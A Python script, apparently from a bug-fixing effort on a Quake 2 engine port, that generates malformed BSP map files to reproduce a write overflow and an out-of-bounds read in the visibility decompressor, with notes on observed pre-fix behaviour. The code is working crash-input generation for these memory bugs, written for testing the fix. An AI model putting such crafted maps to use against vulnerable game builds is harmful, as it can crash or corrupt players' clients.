#!/usr/bin/env python3
# Copyright (C) 2026 ref_mtl port
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
#
# See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
# 02110-1301, USA.

"""AE4: craft BSPs that drive the Mod_DecompressVis (src/files/pvs.c)
edges, staged through the AE9 batched-host fallback.

Bug A (row overflow): Mod_LoadVisibility validates numclusters only
against the lump length (Z5c), not against MAX_MAP_LEAFS.  A VIS lump
big enough to hold the cluster table (8 bytes/cluster) lets
numclusters exceed MAX_MAP_LEAFS=65536, and Mod_ClusterPVS then asks
Mod_DecompressVis to decompress row=(numclusters+7)>>3 bytes into
`decompressed[MAX_MAP_LEAFS/8]`: a global write overflow.

Bug B (early-terminating stream): the decompressor loop advances the
input until `row` decompressed bytes are produced, but a `00 00` run
writes zero bytes; a stream of `00 00` pairs at the end of the lump
makes the read walk past the lump and past the end of the hunk
allocation.  numclusters stays under MAX_MAP_LEAFS here, so the Z5c
table and bitofs checks both pass.

Both are built by appending a fresh VIS lump to shipped base1.bsp
and rewriting the header's LUMP_VISIBILITY entry; every other lump
is untouched.

AF3 adds a third family (build_minimodel): synthetic from-scratch
micro-BSPs that drive the lump-end over-read inside the renderer's
hunk, where the distance from the visibility lump to the END OF THE
WHOLE HUNK MAPPING is only a few hundred bytes.  base1-based maps
can never show that: their post-vis lumps are megabytes deep.
"""

import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from genbsp import collect_maps, LUMP_NAMES

LUMP_VIS = LUMP_NAMES.index("visibility")
DVIS_PVS = 0
DVIS_PAS = 1


def relump(maps, name, vis_payload):
    """Return base1 bytes with the VISIBILITY lump replaced by
    vis_payload, appended at the end of the file."""
    data = bytearray(maps[name])
    oldofs, oldlen = struct.unpack_from("<II", data, 8 + LUMP_VIS * 8)
    # Keep everything else: keep the old bytes (now dangling) and
    # point the lump entry at the appended payload instead.  Old
    # lumps may overlap the old vis region but nothing else reads it.
    newofs = len(data)
    data += vis_payload
    struct.pack_into("<II", data, 8 + LUMP_VIS * 8, newofs, len(vis_payload))
    return bytes(data), oldofs, oldlen


def build_bigvis(maps):
    # numclusters 100000 > MAX_MAP_LEAFS; row = 12500 > 8192.
    n = 100000
    table_words = 1 + 2 * n
    # literal stream: 13000 nonzero bytes, enough to fill any row
    stream_len = 13000
    payload = bytearray(4 + 8 * n)
    struct.pack_into("<i", payload, 0, n)
    bitofs = 4 + 8 * n - stream_len
    for i in range(n):
        struct.pack_into("<ii", payload, 4 + 8 * i, bitofs, bitofs)
    payload += b"\x2a" * stream_len
    assert len(payload) == 4 + 8 * n + stream_len
    return relump(maps, "base1.bsp", bytes(payload))


def build_earlyterm(maps):
    # numclusters 20000 (under the cap), bitofs at the very end of the
    # lump pointing at `00 00` pairs.
    n = 20000
    payload = bytearray(4 + 8 * n + 8)
    struct.pack_into("<i", payload, 0, n)
    bitofs = 4 + 8 * n
    for i in range(n):
        struct.pack_into("<ii", payload, 4 + 8 * i, bitofs, bitofs)
    payload += b"\x00" * 8
    return relump(maps, "base1.bsp", bytes(payload))


def build_minimodel(mode):
    """AF3.1: a synthetic, fully valid micro-BSP whose visibility lump
    is the last big hunk allocation.  numclusters is 65536, so row is
    exactly sizeof(decompressed) == 8192 and the AE10 row guard passes;
    Z5c accepts bitofs <= filelen, so the hostile variants park the
    PVS stream exactly at the end of the visibility lump and the
    decompressor must walk into whatever the hunk holds after it.

    Hunk order (Mod_LoadBrushModel): ... marksurfaces, VISIBILITY,
    leafs, nodes, submodels.  Post-vis hunk images here total 864
    rounded bytes, so the walk's fate is decided by what those
    post-vis bytes contain.  On the release host all three variants
    stayed inside mapped memory: the vis image sat about 6.9 MB
    below later hunk allocations (measured, af3_host_evidence), so
    Hunk_End's trim did not put the mapping edge anywhere near this
    stream.  The faulting class shows deterministically in the
    malloc-edge harness (fuzz_pvs without HUNK_SLACK): 55 of 92
    seeds fault pre-fix.  Observed host behaviour, pre-fix:

      mode 'fair':  bitofs sits at the end of the 65536-cluster table,
                    at a real 8192-byte literal stream inside the lump.
                    Loads, and decompresses to an all-0x01 row before
                    and after the fix.
      mode 'neigh': bitofs == filelen and the post-vis images hold
                    nonzero leaf/node/model geometry.  Host run,
                    pre-fix: no fault, consumed 16386 (the AE10
                    2 * row budget exhausted), row_full, and every
                    single consumed byte sits PAST the visibility
                    lump - the whole decoded row is fabricated from
                    hunk bytes that follow the vis image.  That is
                    the silent neighbour-clobber case the AF3 brief
                    anticipates ("if it reads neighbouring hunk
                    bytes, say that").
      mode 'guard': same map, but the leaf/node bounds and the whole
                    dmodel_t record are zero bytes (legal for both
                    loaders; the split plane moves to x == -24 so
                    the all-zero bounds still leave the spawn at
                    (8, 0, 0) in the empty leaf).  Host run,
                    pre-fix: the walk eats 00 00 empty zero-runs
                    through the budget (consumed 16385) and lands
                    on a nonzero count byte in later hunk data, so
                    the row completes as ALL ZEROS - every cluster
                    reads invisible, silently wrong PVS, no fault.
                    The same shape at a malloc edge (fuzz_pvs, no
                    HUNK_SLACK) faults under ASan.
    """
    NPLANES = 384  # keeps the phase honest; post-vis region stays tiny

    zeroed = mode == "guard"
    nclusters = 65536
    table_len = 4 + 8 * nclusters  # 524292
    stream = b"\x01" * 8192 if mode == "fair" else b""
    vis = bytearray(table_len + len(stream))
    vis[table_len:] = stream
    struct.pack_into("<i", vis, 0, nclusters)
    for i in range(nclusters):
        # Z5c allows bitofs <= filelen; the hostile variants park the
        # stream exactly at the lump end, the fair one at its payload
        # (the 8192-byte stream sits right after the cluster table).
        struct.pack_into("<ii", vis, 4 + 8 * i,
                         table_len if mode != "fair" else table_len, 4)

    plane_rest = bytearray()
    for i in range(NPLANES - 7):
        plane_rest += struct.pack("<4fi", 0.0, 1.0, 0.0,
                                  (i + 7) * 0.001 + 0.0001220703125, 0)
    # plane 0 splits x == -24: the -side child is the solid shell
    # (leaf 0), the +side child holds the camera at (8, 0, 0)
    #
    # node 1 splits the +x half at z == -25.  planes 1..6 form the
    # collision floor box under the spawn, x [-120, 120], y [-120,
    # 120], z [-120, -25], plane 1 (top face) doubling as node 1's
    # split plane.  planes 8..13 form a second solid "spawn plug"
    # brush, x [-40, 40], y [-40, 40], z [-25, 50], listed in the
    # EMPTY leaf 1's LEAFBRUSHES.  Q2 convention: a brush is the
    # intersection of the BACK sides of its planes (dot(p,n) - dist
    # <= 0 for every side), so each normal points OUT of the box.
    # Measured on shipped maps (base64.bsp leaf histogram): leaves
    # carrying solid brushes are themselves CONTENTS_SOLID and name
    # the brush in LEAFBRUSHES.  Three host facts measured with an
    # instrumented game build explain the plug:
    #  - SelectSpawnPoint adds 9 and PutClientInServer adds 1 more,
    #    so the player origin sits at (8, 0, 10) with the box
    #    z [-14, 42]; nothing ever drops it toward the floor.
    #  - KillBox's gi.trace(origin,mins,maxs,origin,...) is a
    #    point-position trace: CM_BoxTrace takes the start == end
    #    position-test path and only reports allsolid/fraction 0
    #    when the player box lies entirely INSIDE a brush.  The
    #    floor 15 units below the box bottom can never do that.
    #  - With fraction 1, SV_Trace still returns tr.ent == the world
    #    edict (SV_Trace hardcodes clip.trace.ent = ge->edicts) whose
    #    solid is 0, so KillBox's while(1) has NO exit: it hammers
    #    T_Damage(world) + trace forever at 100% CPU (the spin4 /
    #    spin5 KillBox -> SV_AreaEdicts_r signature) and the map
    #    never reaches a renderer frame.  On shipped maps the spawn
    #    box overlaps level geometry enough that the position test
    #    returns fraction 0, tr.ent->solid == SOLID_BSP (set by
    #    SP_worldspawn) and KillBox returns false at once.  The plug
    #    brush reproduces that: the position test reports allsolid,
    #    KillBox fails cleanly, and the camera still starts in leaf 1
    #    (cluster 0) because the renderer reads leaf clusters, never
    #    brush contents - the hostile PVS row is still the one
    #    decompressed.
    planes = (
              struct.pack("<4fi", 1.0, 0.0, 0.0, -24.0, 0)
              + struct.pack("<4fi", 0.0, 0.0, 1.0, -25.0, 0)
              + struct.pack("<4fi", 1.0, 0.0, 0.0, 120.0, 0)
              + struct.pack("<4fi", -1.0, 0.0, 0.0, 120.0, 0)
              + struct.pack("<4fi", 0.0, 1.0, 0.0, 120.0, 0)
              + struct.pack("<4fi", 0.0, -1.0, 0.0, 120.0, 0)
              + struct.pack("<4fi", 0.0, 0.0, -1.0, 120.0, 0)
              + plane_rest
              + struct.pack("<4fi", 0.0, 0.0, -1.0, 25.0, 0)
              + struct.pack("<4fi", 0.0, 0.0, 1.0, 50.0, 0)
              + struct.pack("<4fi", 1.0, 0.0, 0.0, 40.0, 0)
              + struct.pack("<4fi", -1.0, 0.0, 0.0, 40.0, 0)
              + struct.pack("<4fi", 0.0, 1.0, 0.0, 40.0, 0)
              + struct.pack("<4fi", 0.0, -1.0, 0.0, 40.0, 0))
    verts = struct.pack("<3f", 0.0, 0.0, 0.0)
    # dnode children are node index or -(leafnum + 1).  node 0: +x
    # child is node 1, -x child is leaf 0.  node 1: +z child is leaf
    # 1 (empty, camera), -z child is leaf 2 (solid floor).
    if zeroed:
        nodeb = (0, 0, 0, 0, 0, 0)
    else:
        nodeb = (-128, -128, -128, 127, 127, 127)
    node = (struct.pack("<i2i6h2H", 0, 1, -1, *nodeb, 0, 0) +
            struct.pack("<i2i6h2H", 1, -2, -3, *nodeb, 0, 0))
    # leaf 0: solid shell (the game CM requires leaf 0 contents ==
    # CONTENTS_SOLID == 1 per files.h; cluster -1).  leaf 1: the half
    # the camera starts in, cluster 0 -> the hostile stream.  Its
    # CONTENTS are 1 because CM_TestInLeaf gates a leaf's brushes on
    # (leaf->contents & trace_contents): a contents-0 leaf is invisible
    # to every trace mask, so no leaf brush could ever make KillBox's
    # position test report allsolid.  Shipped maps agree: base1.bsp has
    # 2037 contents-0 leaves that carry no collidable brushes.  The
    # position test.  leaf 3 is a contents-0 leaf with cluster -1:
    # CMod_LoadLeafs ERR_DROPs ("Map does not have an empty leaf")
    # unless some leaf i >= 1 has contents == 0, and a contents-0 leaf
    # is unreachable by the node tree (no node child points at it).
    def leaf(contents, cluster, mins, maxs, nbrushes=0, fbrush=0):
        # firstleafface, numleaffaces, firstleafbrush, numleafbrushes
        return struct.pack("<ihh6hHHHH", contents, cluster, 0,
                           *mins, *maxs, 0, 0, fbrush, nbrushes)
    # leaf 2 lists brush 0 (the floor) so CM_TraceToLeaf/CM_ClipLink
    # brushes can find it when the player box is walked; leaf 1 lists
    # brush 1 (the spawn plug, leafbrushes entry 1) for the KillBox
    # position test
    if zeroed:
        leaves = leaf(1, -1, (0, 0, 0), (0, 0, 0)) + \
                 leaf(1, 0, (0, 0, 0), (0, 0, 0), 1, 1) + \
                 leaf(1, -1, (0, 0, 0), (0, 0, 0), 1) + \
                 leaf(0, -1, (0, 0, 0), (0, 0, 0))
    else:
        leaves = leaf(1, -1, (-128, -128, -128), (127, 127, 127)) + \
                 leaf(1, 0, (1, -128, -25), (127, 127, 127), 1, 1) + \
                 leaf(1, -1, (1, -128, -120), (127, 127, -25), 1) + \
                 leaf(0, -1, (0, 0, 0), (0, 0, 0))
    # headnode -1 is legal for both loaders (the game CM stores it
    # unchecked, the renderer only bounds firstnode from above), so
    # the whole dmodel_t record can be zero bytes on the guard map
    if zeroed:
        model = struct.pack("<12i", *(0,) * 12)
    else:
        model = struct.pack("<9f3i",
                            -1.111111, -1.111111, -1.111111,
                            1.111111, 1.111111, 1.111111,
                            8.0, 0.0, 0.0, 0, 0, 0)
    edge = struct.pack("<4H", 0, 0, 0, 0)
    # CMod_LoadLeafBrushes (game CM) ERR_DROPs ("Map with no planes")
    # on a zero-length LEAFBRUSHES lump, and that drop happens before
    # CM_LoadMap ever hands the model to the renderer.  One entry
    # naming leaf 0 satisfies it.
    leafbrushes = struct.pack("<2H", 0, 1)
    # CMod_LoadSurfaces (game CM) ERR_DROPs on a zero-length TEXINFO
    # lump ("Map with no surfaces"), so ship one real texture entry.
    # texinfo_t: float vecs[2][4], int flags, value, char texture[32],
    # int nexttexinfo == 76 bytes (files.h).  Identity scale, next
    # texinfo -1 (end of animation chain).
    texvm = struct.pack("<8f", 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0)
    texinfo = texvm + struct.pack("<2i", 0, 0) + \
        b"base1/tallklite" + b"\0" * (32 - 15) + struct.pack("<i", -1)
    ents = (b"{\n\"classname\" \"worldspawn\"\n"
            b"\"worldtype\" \"0\"\n\"message\" \"af3 vis host\"\n}\n"
            b"{\n\"classname\" \"info_player_start\"\n"
            b"\"origin\" \"8 0 0\"\n\"angle\" \"0\"\n}\n")

    # one solid floor brush (game CM only; the renderer ignores these
    # lumps and they never enter the hunk).  yquake2's dbrush_t is
    # {firstside, numsides, contents} and its dbrushside_t is a
    # 4-byte {planenum, texinfo} record - measured on shipped maps
    # (base64.bsp: 163728 / 40932 = 4.0 bytes per side).  Brush
    # normals point OUT of the box (interior is dot-dist <= 0 for
    # every side).
    # brush 0: the floor (planes 1..6).  brush 1: the spawn plug
    # (planes NPLANES..NPLANES+5 = the six packs appended after
    # plane_rest above), listed in EMPTY leaf 1's leafbrushes so the
    # KillBox position test finds the player box allsolid inside it.
    brushes = struct.pack("<3i", 0, 6, 1) + \
        struct.pack("<3i", 6, 6, 1)
    brushsides = b"".join(struct.pack("<HH", p, 0)
            for p in list(range(1, 7)) + list(range(NPLANES, NPLANES + 6)))
    lumps = {0: bytes(ents), 1: bytes(planes), 2: verts, 3: bytes(vis),
             4: node, 5: texinfo, 6: b"", 7: b"", 8: leaves, 9: b"",
             10: leafbrushes, 11: edge, 12: b"", 13: model,
             14: brushes, 15: brushsides, 16: b"", 17: b"", 18: b""}
    hdr_len = 8 + 19 * 8
    body = bytearray()
    table = bytearray()
    for i in range(19):
        payload = lumps[i]
        while len(body) % 4:
            body += b"\0"
        table += struct.pack("<ii", hdr_len + len(body), len(payload))
        body += payload
    head = struct.pack("<2i", 0x50534249, 38) + bytes(table)
    return bytes(head) + bytes(body)


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    maps = collect_maps("/Volumes/Scratch/dev/quake2/Quake 2.app/Contents/Resources")
    os.makedirs(out, exist_ok=True)
    for name, builder in (("cal_bigvis", build_bigvis),
            ("cal_earlyterm", build_earlyterm)):
        data, oldofs, oldlen = builder(maps)
        with open(os.path.join(out, name + ".bsp"), "wb") as f:
            f.write(data)
        print("%s: base1.bsp vis lump (%d bytes @%d) replaced, "
                "file now %d bytes" % (name, oldlen, oldofs, len(data)))
    for name, mode in (("af3_fair", "fair"), ("af3_neigh", "neigh"),
            ("af3_guard", "guard")):
        data = build_minimodel(mode)
        with open(os.path.join(out, name + ".bsp"), "wb") as f:
            f.write(data)
        print("%s: synthetic micro-BSP (%s), %d bytes, vis lump %d bytes"
                % (name, mode, len(data), 4 + 8 * 65536))
    return 0


if __name__ == "__main__":
    sys.exit(main())
